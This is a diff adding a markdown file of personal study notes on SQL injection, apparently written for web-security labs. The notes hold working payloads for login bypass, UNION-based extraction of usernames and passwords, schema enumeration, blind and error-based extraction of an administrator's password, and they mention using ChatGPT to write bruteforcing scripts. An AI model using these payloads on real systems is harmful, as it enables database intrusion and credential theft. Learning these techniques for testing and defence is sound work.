@@ -1,0 +1,147 @@
+# SQL injection
+
+basicaly a vulnerabily where you have an input value
+that you can manipulate
+and is insecurely send to the sql database
+thus giving us access more access then we should have
+
+
+## note
+sometimes a + needs to be used in stead of spaces
+
+## payloads explained
+
+simplest is:
+test' OR 1=1 --
+
+this completes the query with test
+but then closes it
+add the OR operator
+1=1 making any query correct
+-- commenting out the rest of the line
+
+sometimes payloads dont just work,
+fe in the url they sometimes could need to be url encoded to work
+
+## union selects
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+using this we can determine if there can be selected more collums
+
+after determining the collumns
+we can use the following to search for a particular string
+' UNION SELECT 'searchstring',NULL,NULL--
+' UNION SELECT NULL,'searchstring',NULL--
+' UNION SELECT NULL,NULL,'searchstring'--
+
+union abuse is using union statement
+to merge another table
+' UNION SELECT user,password FROM users--
+
+if there arent enough collumns
+you could concatenate another collumns
+' UNION SELECT username || '~' || password FROM users--
+|| '~' || this is a seperator in an oracle database
+
+## gathering extra info
+using builtin stuff,
+combining with for example a UNION
+
+Database type           Query
+Microsoft, MySQL        SELECT @@version
+Oracle                  SELECT * FROM v$version
+PostgreSQL              SELECT version()
+
+## schema
+most databases have a table with the schema
+this is a table containing info of the tables
+SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+
+first gathering the collumns
+' ORDER BY 2--
+
+then gather the tables
+' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
+
+then gathering the columns of the table
+' UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns WHERE table_name = 'foundtablename'--
+or if being uncertain this reveals all collumns with table name to search in
+' UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns--
+
+after finding the collumn names we can use these and the specific table to gather info we need to know
+' UNION SELECT columnname1,columnname2 FROM tablename--
+
+## blind injection
+is more difficult,
+it does not directly show the content of the query
+but it changes a response fe showing a welcome message
+
+fe
+xyz' AND '1'='1
+xyz' AND '1'='2
+the first would show the welcome message
+but the second would not bcs it would be false
+
+after determining the difference you'd need to check the password 1by1
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+if its true the first character fo the password is greater than m
+thus trying the next its half we can narrow down the correct password
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+
+abcdefghijklmnopqrstuvwxyz0123456789
+
+ofc its tedious to do this for longer passwords
+thus using chatgpt you can write a quick "bruteforcer"
+see "sql_blind_test.py"
+
+## error based
+even harder
+
+like the blind injection
+we get another output in the errors
+thus making it throw a different error based on if anything is true or false
+
+first testing
+'
+gives an error
+showing us we get a syntax error
+''
+shows its fixed showing no error
+
+givesn another error
+'||(SELECT '')||'
+
+fixes the error
+'||(SELECT '' FROM dual)||'
+
+trying a nonexistant table gives an error
+'||(SELECT '' FROM tryingannonexistanttable)||'
+
+trying to get some users
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+
+
+when recieving an error we get the error
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+if we find a user we can determine the password length
+'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+then checking the char at each location
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+ofc this will take to long to do
+thus we write ask gpt to ask make a script
+see "sql_error_test.py"
+
+## payloads
+
+stored in the root folder: payloads_sql.lst
